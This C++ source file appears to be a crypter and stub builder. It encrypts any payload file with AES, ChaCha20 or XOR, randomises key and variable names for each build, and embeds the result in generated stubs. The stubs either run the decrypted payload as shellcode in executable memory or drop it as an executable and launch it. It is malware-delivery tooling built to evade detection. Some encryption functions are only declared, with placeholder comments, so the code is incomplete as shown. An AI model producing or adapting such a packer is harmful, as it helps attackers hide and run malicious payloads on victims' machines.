#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <chrono>
#include <regex>
#include <sstream>
#include <iomanip>
#include <thread>

class EnhancedStubLinker {
private:
    std::mt19937 rng;
    
    // Enhanced RNG initialization
    void initializeRNG() {
        std::random_device rd;
        auto now = std::chrono::high_resolution_clock::now();
        auto duration = now.time_since_epoch();
        auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
        
        std::seed_seq seed{
            rd(), rd(), rd(), rd(),
            static_cast<unsigned int>(std::time(nullptr)),
            static_cast<unsigned int>(std::clock()),
            static_cast<unsigned int>(millis),
            static_cast<unsigned int>(millis >> 32),
            static_cast<unsigned int>(std::hash<std::thread::id>{}(std::this_thread::get_id()))
        };
        
        rng.seed(seed);
    }
    
    // Extract key and nonce from stub source
    struct CryptoKeys {
        std::string keyHex;
        std::string nonceHex;
        std::string keyVarName;
        std::string nonceVarName;
        std::string encryptionType; // "aes", "chacha20", "xor"
        bool found;
    };
    
    CryptoKeys extractKeysFromStub(const std::string& stubContent) {
        CryptoKeys keys;
        keys.found = false;
        
        // Try to detect encryption type
        if (stubContent.find("ChaCha20") != std::string::npos || 
            stubContent.find("chacha20") != std::string::npos ||
            stubContent.find("quarterRound") != std::string::npos) {
            keys.encryptionType = "chacha20";
        } else if (stubContent.find("aesCtrDecrypt") != std::string::npos || 
                   stubContent.find("AES") != std::string::npos ||
                   stubContent.find("sbox[256]") != std::string::npos) {
            keys.encryptionType = "aes";
        } else if (stubContent.find("xorDecrypt") != std::string::npos) {
            keys.encryptionType = "xor";
        } else {
            keys.encryptionType = "aes"; // default
        }
        
        // Pattern to find key definitions
        // Matches: const std::string KEY_xxx = "hexstring";
        std::regex keyPattern(R"(const\s+std::string\s+(\w+)\s*=\s*\"([0-9a-fA-F]+)\"\s*;)");
        
        std::smatch match;
        std::string::const_iterator searchStart(stubContent.cbegin());
        
        // Find all string constants that look like keys/nonces
        std::vector<std::pair<std::string, std::string>> constants;
        
        while (std::regex_search(searchStart, stubContent.cend(), match, keyPattern)) {
            std::string varName = match[1];
            std::string hexValue = match[2];
            constants.push_back({varName, hexValue});
            searchStart = match.suffix().first;
        }
        
        // Identify which constants are keys and nonces based on their length and variable names
        for (const auto& [varName, hexValue] : constants) {
            std::string varNameLower = varName;
            std::transform(varNameLower.begin(), varNameLower.end(), varNameLower.begin(), ::tolower);
            
            if (varNameLower.find("key") != std::string::npos) {
                keys.keyVarName = varName;
                keys.keyHex = hexValue;
            } else if (varNameLower.find("nonce") != std::string::npos || 
                      varNameLower.find("iv") != std::string::npos) {
                keys.nonceVarName = varName;
                keys.nonceHex = hexValue;
            } else {
                // Guess based on length
                if (keys.encryptionType == "chacha20") {
                    if (hexValue.length() == 64 && keys.keyHex.empty()) { // 32 bytes
                        keys.keyVarName = varName;
                        keys.keyHex = hexValue;
                    } else if (hexValue.length() == 24 && keys.nonceHex.empty()) { // 12 bytes
                        keys.nonceVarName = varName;
                        keys.nonceHex = hexValue;
                    }
                } else if (keys.encryptionType == "aes") {
                    if (hexValue.length() == 32 && keys.keyHex.empty()) { // 16 bytes
                        keys.keyVarName = varName;
                        keys.keyHex = hexValue;
                    } else if (hexValue.length() == 32 && keys.nonceHex.empty()) { // 16 bytes
                        keys.nonceVarName = varName;
                        keys.nonceHex = hexValue;
                    }
                }
            }
        }
        
        keys.found = !keys.keyHex.empty();
        return keys;
    }
    
    // Convert hex string to bytes
    std::vector<uint8_t> hexToBytes(const std::string& hex) {
        std::vector<uint8_t> bytes;
        for (size_t i = 0; i < hex.length(); i += 2) {
            std::string byteString = hex.substr(i, 2);
            uint8_t byte = static_cast<uint8_t>(std::stoul(byteString, nullptr, 16));
            bytes.push_back(byte);
        }
        return bytes;
    }
    
    // Convert bytes to hex string
    std::string bytesToHex(const uint8_t* data, size_t len) {
        std::stringstream ss;
        ss << std::hex << std::setfill('0');
        for (size_t i = 0; i < len; i++) {
            ss << std::setw(2) << (int)data[i];
        }
        return ss.str();
    }
    
    // AES encryption (same as in encryptor)
    static const uint8_t sbox[256];
    static const uint8_t rcon[11];
    
    // [AES implementation methods would go here - same as in universal_encryptor.cpp]
    // Including: gmul, subBytes, shiftRows, mixColumns, addRoundKey, keyExpansion, aesEncryptBlock, aesCtrCrypt
    
    // ChaCha20 encryption (same as in encryptor)
    // [ChaCha20 implementation methods would go here - same as in universal_encryptor.cpp]
    // Including: quarterRound, chachaBlock, initChachaState, chacha20Crypt
    
    // For brevity, I'll include just the essential encryption method signatures
    void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                    const uint8_t key[16], const uint8_t nonce[16]);
    
    void chacha20Crypt(const uint8_t* input, uint8_t* output, size_t length,
                       const uint8_t key[32], const uint8_t nonce[12], uint32_t counter = 0);
    
    void xorCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                  const uint8_t* key, size_t keyLen) {
        for (size_t i = 0; i < length; i++) {
            output[i] = input[i] ^ key[i % keyLen];
        }
    }
    
    // Generate random string for variable names
    std::string generateRandomString(size_t length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        std::string result;
        result.reserve(length);
        
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        for (size_t i = 0; i < length; i++) {
            result += charset[dist(rng)];
        }
        return result;
    }
    
    // Generate random bytes
    void generateRandomBytes(uint8_t* buffer, size_t length) {
        std::uniform_int_distribution<int> dist(0, 255);
        for (size_t i = 0; i < length; i++) {
            buffer[i] = dist(rng);
        }
    }
    
    // Generate a new stub with specified encryption method
    std::string generateStub(const std::string& encryptionType, const std::string& stubType) {
        // Generate a new seed for maximum uniqueness
        auto now = std::chrono::high_resolution_clock::now();
        auto seed = std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()).count();
        rng.seed(seed);
        
        // Generate keys based on encryption type
        std::string keyHex, nonceHex;
        std::string keyVarName = "KEY_" + generateRandomString(8);
        std::string nonceVarName = "NONCE_" + generateRandomString(8);
        std::string payloadVarName = "PAYLOAD_" + generateRandomString(8);
        
        if (encryptionType == "chacha20") {
            uint8_t key[32];
            uint8_t nonce[12];
            generateRandomBytes(key, 32);
            generateRandomBytes(nonce, 12);
            keyHex = bytesToHex(key, 32);
            nonceHex = bytesToHex(nonce, 12);
        } else if (encryptionType == "aes") {
            uint8_t key[16];
            uint8_t nonce[16];
            generateRandomBytes(key, 16);
            generateRandomBytes(nonce, 16);
            keyHex = bytesToHex(key, 16);
            nonceHex = bytesToHex(nonce, 16);
        } else { // xor
            uint8_t key[24]; // 24 byte key for XOR
            generateRandomBytes(key, 24);
            keyHex = bytesToHex(key, 24);
        }
        
        std::stringstream stub;
        
        // Generate stub header
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdlib>\n";
        stub << "#include <cstdint>\n\n";
        
        if (stubType == "execute") {
            stub << "#ifdef _WIN32\n";
            stub << "#include <windows.h>\n";
            stub << "#else\n";
            stub << "#include <sys/mman.h>\n";
            stub << "#include <unistd.h>\n";
            stub << "#endif\n\n";
        }
        
        // Add encryption keys
        stub << "// Encryption keys\n";
        stub << "const std::string " << keyVarName << " = \"" << keyHex << "\";\n";
        if (!nonceHex.empty()) {
            stub << "const std::string " << nonceVarName << " = \"" << nonceHex << "\";\n";
        }
        stub << "\n";
        
        // Add sample payload array
        stub << "// Encrypted payload (sample data - replace with actual payload)\n";
        stub << "unsigned char " << payloadVarName << "[] = {\n";
        stub << "    0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21, 0x0a, 0x00,\n";
        stub << "    0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70,\n";
        stub << "    0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x20, 0x66, 0x6f, 0x72,\n";
        stub << "    0x20, 0x64, 0x65, 0x6d, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e\n";
        stub << "};\n\n";
        
        // Add decryption implementation based on type
        if (encryptionType == "chacha20") {
            stub << generateChaCha20Implementation();
        } else if (encryptionType == "aes") {
            stub << generateAESImplementation();
        } else {
            stub << generateXORImplementation();
        }
        
        // Add hex conversion functions
        stub << R"(
uint8_t hexCharToInt(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

void hexStringToBytes(const std::string& hex, uint8_t* bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        bytes[i] = (hexCharToInt(hex[2*i]) << 4) | hexCharToInt(hex[2*i + 1]);
    }
}
)";
        
        // Add main function
        stub << "\nint main() {\n";
        stub << "    // Convert keys from hex\n";
        
        if (encryptionType == "chacha20") {
            stub << "    uint8_t key[32];\n";
            stub << "    uint8_t nonce[12];\n";
            stub << "    hexStringToBytes(" << keyVarName << ", key, 32);\n";
            stub << "    hexStringToBytes(" << nonceVarName << ", nonce, 12);\n";
        } else if (encryptionType == "aes") {
            stub << "    uint8_t key[16];\n";
            stub << "    uint8_t nonce[16];\n";
            stub << "    hexStringToBytes(" << keyVarName << ", key, 16);\n";
            stub << "    hexStringToBytes(" << nonceVarName << ", nonce, 16);\n";
        } else {
            stub << "    uint8_t key[" << keyHex.length()/2 << "];\n";
            stub << "    hexStringToBytes(" << keyVarName << ", key, " << keyHex.length()/2 << ");\n";
        }
        
        stub << "\n    // Decrypt payload\n";
        stub << "    size_t payloadSize = sizeof(" << payloadVarName << ");\n";
        stub << "    std::vector<uint8_t> decrypted(payloadSize);\n";
        
        if (encryptionType == "chacha20") {
            stub << "    chacha20Decrypt(" << payloadVarName << ", decrypted.data(), payloadSize, key, nonce);\n";
        } else if (encryptionType == "aes") {
            stub << "    aesCtrDecrypt(" << payloadVarName << ", decrypted.data(), payloadSize, key, nonce);\n";
        } else {
            stub << "    xorDecrypt(" << payloadVarName << ", decrypted.data(), payloadSize, key, " << keyHex.length()/2 << ");\n";
        }
        
        if (stubType == "execute") {
            stub << R"(
    // Execute decrypted payload
#ifdef _WIN32
    void* exec = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, decrypted.data(), payloadSize);
        ((void(*)())exec)();
    }
#else
    void* exec = mmap(NULL, payloadSize, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec != MAP_FAILED) {
        memcpy(exec, decrypted.data(), payloadSize);
        ((void(*)())exec)();
    }
#endif
)";
        } else if (stubType == "dropper") {
            stub << R"(
    // Write decrypted payload to file
    std::string filename = "dropped_file.exe";
    std::ofstream out(filename, std::ios::binary);
    if (out) {
        out.write(reinterpret_cast<char*>(decrypted.data()), payloadSize);
        out.close();
        std::cout << "File dropped: " << filename << std::endl;
        
#ifdef _WIN32
        ShellExecuteA(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOW);
#else
        system(("chmod +x " + filename + " && ./" + filename).c_str());
#endif
    }
)";
        } else { // debugger
            stub << R"(
    // Display decrypted payload info
    std::cout << "Payload decrypted successfully!" << std::endl;
    std::cout << "Size: " << payloadSize << " bytes" << std::endl;
    std::cout << "First 16 bytes: ";
    for (int i = 0; i < 16 && i < payloadSize; i++) {
        std::cout << std::hex << (int)decrypted[i] << " ";
    }
    std::cout << std::endl;
)";
        }
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    std::string generateChaCha20Implementation() {
        return R"(
// ChaCha20 implementation
inline void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

void chachaBlock(uint32_t output[16], const uint32_t input[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) {
        x[i] = input[i];
    }
    
    for (int i = 0; i < 10; i++) {
        quarterRound(x[0], x[4], x[8], x[12]);
        quarterRound(x[1], x[5], x[9], x[13]);
        quarterRound(x[2], x[6], x[10], x[14]);
        quarterRound(x[3], x[7], x[11], x[15]);
        
        quarterRound(x[0], x[5], x[10], x[15]);
        quarterRound(x[1], x[6], x[11], x[12]);
        quarterRound(x[2], x[7], x[8], x[13]);
        quarterRound(x[3], x[4], x[9], x[14]);
    }
    
    for (int i = 0; i < 16; i++) {
        output[i] = x[i] + input[i];
    }
}

void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;
    
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[4*i]) |
                       ((uint32_t)key[4*i + 1] << 8) |
                       ((uint32_t)key[4*i + 2] << 16) |
                       ((uint32_t)key[4*i + 3] << 24);
    }
    
    state[12] = counter;
    
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[4*i]) |
                        ((uint32_t)nonce[4*i + 1] << 8) |
                        ((uint32_t)nonce[4*i + 2] << 16) |
                        ((uint32_t)nonce[4*i + 3] << 24);
    }
}

void chacha20Decrypt(const uint8_t* input, uint8_t* output, size_t length,
                     const uint8_t key[32], const uint8_t nonce[12]) {
    uint32_t state[16];
    uint32_t keystream[16];
    uint8_t* keystream_bytes = (uint8_t*)keystream;
    uint32_t counter = 0;
    
    size_t processed = 0;
    while (processed < length) {
        initChachaState(state, key, nonce, counter);
        chachaBlock(keystream, state);
        
        size_t blockSize = (length - processed < 64) ? length - processed : 64;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream_bytes[i];
        }
        
        processed += blockSize;
        counter++;
    }
}
)";
    }
    
    std::string generateAESImplementation() {
        return R"(
// Full AES-CTR implementation
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

inline uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void subBytes(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

inline void shiftRows(uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void mixColumns(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
    }
}

inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    memcpy(roundKeys, key, 16);
    
    for (int i = 1; i < 11; i++) {
        memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
        uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
        for (int j = 0; j < 4; j++) temp[j] = sbox[temp[j]];
        temp[0] ^= (1 << (i-1));
        for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
        for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
    }
}

inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    memcpy(state, input, 16);
    addRoundKey(state, roundKeys);
    
    for (int round = 1; round < 10; round++) {
        subBytes(state);
        shiftRows(state);
        mixColumns(state);
        addRoundKey(state, roundKeys + round * 16);
    }
    
    subBytes(state);
    shiftRows(state);
    addRoundKey(state, roundKeys + 10 * 16);
    memcpy(output, state, 16);
}

inline void incrementCounter(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

void aesCtrDecrypt(const uint8_t* input, uint8_t* output, size_t length,
                   const uint8_t key[16], const uint8_t nonce[16]) {
    uint8_t roundKeys[176];
    keyExpansion(key, roundKeys);
    
    uint8_t counter[16];
    uint8_t keystream[16];
    memcpy(counter, nonce, 16);
    
    size_t processed = 0;
    while (processed < length) {
        aesEncryptBlock(counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        incrementCounter(counter);
    }
}
)";
    }
    
    std::string generateXORImplementation() {
        return R"(
// XOR decryption
void xorDecrypt(const uint8_t* input, uint8_t* output, size_t length,
                const uint8_t* key, size_t keyLen) {
    for (size_t i = 0; i < length; i++) {
        output[i] = input[i] ^ key[i % keyLen];
    }
}
)";
    }
    
public:
    EnhancedStubLinker() {
        initializeRNG();
    }
    
    bool linkPayloadToStub(const std::string& stubFile, const std::string& payloadFile, 
                          const std::string& outputFile) {
        std::cout << "\n=== Enhanced Stub Linker ===" << std::endl;
        std::cout << "Using enhanced RNG with multiple entropy sources" << std::endl;
        
        // Read stub source
        std::ifstream stubIn(stubFile);
        if (!stubIn) {
            std::cerr << "Failed to open stub file: " << stubFile << std::endl;
            return false;
        }
        
        std::string stubContent((std::istreambuf_iterator<char>(stubIn)),
                               std::istreambuf_iterator<char>());
        stubIn.close();
        
        // Extract keys from stub
        CryptoKeys keys = extractKeysFromStub(stubContent);
        if (!keys.found) {
            std::cerr << "Failed to extract encryption keys from stub!" << std::endl;
            std::cerr << "Make sure the stub contains valid key definitions." << std::endl;
            return false;
        }
        
        std::cout << "\nExtracted from stub:" << std::endl;
        std::cout << "Encryption type: " << keys.encryptionType << std::endl;
        std::cout << "Key variable: " << keys.keyVarName << " = " << keys.keyHex << std::endl;
        if (!keys.nonceHex.empty()) {
            std::cout << "Nonce variable: " << keys.nonceVarName << " = " << keys.nonceHex << std::endl;
        }
        
        // Read payload
        std::ifstream payloadIn(payloadFile, std::ios::binary);
        if (!payloadIn) {
            std::cerr << "Failed to open payload file: " << payloadFile << std::endl;
            return false;
        }
        
        payloadIn.seekg(0, std::ios::end);
        size_t payloadSize = payloadIn.tellg();
        payloadIn.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> payload(payloadSize);
        payloadIn.read(reinterpret_cast<char*>(payload.data()), payloadSize);
        payloadIn.close();
        
        // Encrypt payload using extracted keys
        std::vector<uint8_t> encryptedPayload(payloadSize);
        std::vector<uint8_t> keyBytes = hexToBytes(keys.keyHex);
        std::vector<uint8_t> nonceBytes = hexToBytes(keys.nonceHex);
        
        if (keys.encryptionType == "chacha20") {
            if (keyBytes.size() != 32) {
                std::cerr << "Invalid ChaCha20 key size: " << keyBytes.size() << " (expected 32)" << std::endl;
                return false;
            }
            if (nonceBytes.size() != 12) {
                std::cerr << "Invalid ChaCha20 nonce size: " << nonceBytes.size() << " (expected 12)" << std::endl;
                return false;
            }
            chacha20Crypt(payload.data(), encryptedPayload.data(), payloadSize, 
                         keyBytes.data(), nonceBytes.data());
        } else if (keys.encryptionType == "aes") {
            if (keyBytes.size() != 16) {
                std::cerr << "Invalid AES key size: " << keyBytes.size() << " (expected 16)" << std::endl;
                return false;
            }
            if (nonceBytes.size() != 16) {
                std::cerr << "Invalid AES nonce size: " << nonceBytes.size() << " (expected 16)" << std::endl;
                return false;
            }
            aesCtrCrypt(payload.data(), encryptedPayload.data(), payloadSize,
                       keyBytes.data(), nonceBytes.data());
        } else if (keys.encryptionType == "xor") {
            xorCrypt(payload.data(), encryptedPayload.data(), payloadSize,
                    keyBytes.data(), keyBytes.size());
        }
        
        // Find payload array in stub
        std::regex payloadPattern(R"(unsigned char\s+(\w+)\[\]\s*=\s*\{[^}]*\};)");
        std::smatch payloadMatch;
        
        if (!std::regex_search(stubContent, payloadMatch, payloadPattern)) {
            std::cerr << "Failed to find payload array in stub!" << std::endl;
            return false;
        }
        
        std::string payloadVarName = payloadMatch[1];
        std::cout << "Found payload variable: " << payloadVarName << std::endl;
        
        // Generate new payload array
        std::stringstream newPayloadArray;
        newPayloadArray << "unsigned char " << payloadVarName << "[] = {\n    ";
        
        for (size_t i = 0; i < encryptedPayload.size(); i++) {
            if (i > 0 && i % 16 == 0) {
                newPayloadArray << "\n    ";
            }
            newPayloadArray << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                           << (int)encryptedPayload[i];
            if (i < encryptedPayload.size() - 1) {
                newPayloadArray << ", ";
            }
        }
        newPayloadArray << "\n};";
        
        // Replace payload in stub
        stubContent = std::regex_replace(stubContent, payloadPattern, newPayloadArray.str());
        
        // Update payload size if present
        std::regex sizePattern("size_t\\s+" + payloadVarName + "_size\\s*=\\s*\\d+;");
        if (std::regex_search(stubContent, sizePattern)) {
            std::string newSize = "size_t " + payloadVarName + "_size = " + 
                                 std::to_string(payloadSize) + ";";
            stubContent = std::regex_replace(stubContent, sizePattern, newSize);
        }
        
        // Write output
        std::ofstream out(outputFile);
        if (!out) {
            std::cerr << "Failed to create output file: " << outputFile << std::endl;
            return false;
        }
        
        out << stubContent;
        out.close();
        
        std::cout << "\nSuccessfully linked payload to stub!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Payload size: " << payloadSize << " bytes" << std::endl;
        std::cout << "Ready to compile with: g++ -o output " << outputFile << std::endl;
        
        return true;
    }
    
    // Verify stub integrity
    bool verifyStub(const std::string& stubFile) {
        std::ifstream in(stubFile);
        if (!in) {
            std::cerr << "Failed to open stub file: " << stubFile << std::endl;
            return false;
        }
        
        std::string content((std::istreambuf_iterator<char>(in)),
                           std::istreambuf_iterator<char>());
        in.close();
        
        CryptoKeys keys = extractKeysFromStub(content);
        
        std::cout << "\n=== Stub Verification ===" << std::endl;
        std::cout << "File: " << stubFile << std::endl;
        
        if (keys.found) {
            std::cout << "Status: VALID" << std::endl;
            std::cout << "Encryption: " << keys.encryptionType << std::endl;
            std::cout << "Key: " << keys.keyHex << std::endl;
            if (!keys.nonceHex.empty()) {
                std::cout << "Nonce: " << keys.nonceHex << std::endl;
            }
            return true;
        } else {
            std::cout << "Status: INVALID - No encryption keys found" << std::endl;
            return false;
        }
    }
};

// [Include the AES S-box, rcon, and implementation here - same as in universal_encryptor.cpp]
// [Include the ChaCha20 implementation here - same as in universal_encryptor.cpp]

int main(int argc, char* argv[]) {
    EnhancedStubLinker linker;
    
    if (argc < 2) {
        std::cout << "=== Enhanced Stub Linker ===" << std::endl;
        std::cout << "Links encrypted payloads to stubs using keys extracted from the stub" << std::endl;
        std::cout << "\nUsage:" << std::endl;
        std::cout << "  " << argv[0] << " <stub.cpp> <payload> <output.cpp>" << std::endl;
        std::cout << "  " << argv[0] << " -verify <stub.cpp>" << std::endl;
        std::cout << "\nFeatures:" << std::endl;
        std::cout << "  - Extracts encryption keys from existing stubs" << std::endl;
        std::cout << "  - Supports AES, ChaCha20, and XOR encryption" << std::endl;
        std::cout << "  - Enhanced RNG with multiple entropy sources" << std::endl;
        std::cout << "  - Automatic encryption type detection" << std::endl;
        return 1;
    }
    
    if (std::string(argv[1]) == "-verify") {
        if (argc < 3) {
            std::cerr << "Verify mode requires a stub file" << std::endl;
            return 1;
        }
        return linker.verifyStub(argv[2]) ? 0 : 1;
    }
    
    if (argc < 4) {
        std::cerr << "Link mode requires stub, payload, and output files" << std::endl;
        return 1;
    }
    
    return linker.linkPayloadToStub(argv[1], argv[2], argv[3]) ? 0 : 1;
}